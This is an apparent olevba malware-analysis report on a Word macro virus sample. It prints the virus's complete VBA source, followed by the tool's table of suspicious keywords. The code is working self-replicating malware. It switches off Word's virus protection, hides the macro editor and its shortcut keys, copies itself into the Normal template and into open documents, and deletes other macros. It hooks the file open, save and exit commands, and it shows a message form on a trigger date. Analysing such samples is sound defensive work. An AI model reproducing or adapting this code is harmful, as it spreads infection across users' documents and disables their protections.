olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SUPERJC.bas 
in file: Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e - OLE stream: 'Macros/VBA/Superjc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By JC'S Hacker
' Esto es lo bello que se aprende también a parte de lo mecánico de la Universidad
' JTBH anywhere that you are, you should remember me, uniquely I wish them that all the world Knew that I him Love, and that nothing will do forget her
' and live those that wonderful thet is the love, but never you will find to nothing like as me
' I was your married, of that you never will forget.
' Con muchisimo Orgullo THE-EPN-SNF-XX-CB desde algún rincon del planeta para, todo el mundo
' Felicidades or Happyness Datafellows, I hope that you can kill this bug early before infect so much machines Good Luck

Public Inicial
Public Salva
Public Infecta
Public Infdocum
Sub JCstart()
    Inicial = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Inhab
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub JCfinal()
Application.DisplayAlerts = Inicial
End Sub
Sub VerinfNorm()
    Call Inhab
    On Error GoTo Step1
    Infecta = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Step2
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infecta = True
      If (NMacr <> "Superjc") And (NMacr <> "SPJC") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Step2:
    If Infecta = False Then
      On Error GoTo Step3
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "Superjc", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "SPJC", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Step3:
    End If
Step1:
End Sub
Sub InfectNor()
    On Error GoTo Step4
    Salva = 0
    Infdocum = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Step5
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infdocum = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "Superjc" Then Infdocum = True
      On Error GoTo Step5
      If (NMacr <> "Superjc") And (NMacr <> "SPJC") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Referencia a Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Step5:
    If Infdocum = False Then
      On Error GoTo Step6
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "Superjc", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "SPJC", Object:=wdOrganizerObjectProjectItems
      Salva = 1
Step6:
    End If
Step4:
End Sub
Sub SUPERJC()
    Call JCstart
    Call VerinfNorm
    Call JCfinal
End Sub
Sub Inhab()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Regener()
    On Error GoTo Step7
Set AD = ActiveDocument
    If Salva = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Step7:
End Sub
Sub AutoOpen()
    Call SUPERJC
End Sub
Sub FileClose()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call SUPERJC
    Dialogs(wdDialogFileOpen).Show
    Call JCstart
    Call InfectNor
    Call Regener
    Call JCfinal
End Sub
Sub FileSaveAs()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    Call JCfinal
    On Error GoTo Step11
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Step11:
End Sub
Sub HelpAbout()
    On Error GoTo Step8
    SPJC.Show
Step8:
End Sub
Sub FileExit()
Dim Mes, Dia
Mes = Month(Date)
Dia = Day(Date)
    Call JCstart
    Call VerinfNorm
    Call InfectNor
    On Error GoTo Step9
    If Mes = 9 And Dia = 23 Then SPJC.Show
Step9:
    Call JCfinal
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call SUPERJC
End Sub
Sub FileNew()
    Call SUPERJC
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call SUPERJC
End Sub
Sub ToolsCustomize()
    Call SUPERJC
End Sub
Sub ToolsCustomizeKeyboard()
    Call SUPERJC
End Sub
Sub ViewVBCode()
    Call SUPERJC
End Sub
Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO SPJC.frm 
in file: Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e - OLE stream: 'Macros/VBA/SPJC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hello and Bye�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Happy Birthday Ex-Queen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Do you remember those Ship in that room of the movie...?
Que tiempos aquellos, que pena que ya paso y nunca m�s podr� ser, tu sabes quien soy, no lo olvides.........Siempre te recordar�q^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
System@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Feliz'" IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.CyberHack-based-6ea6b630d1a9babb5123bd717c93b5c7afcee05e' - OLE stream: 'Macros/SPJC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

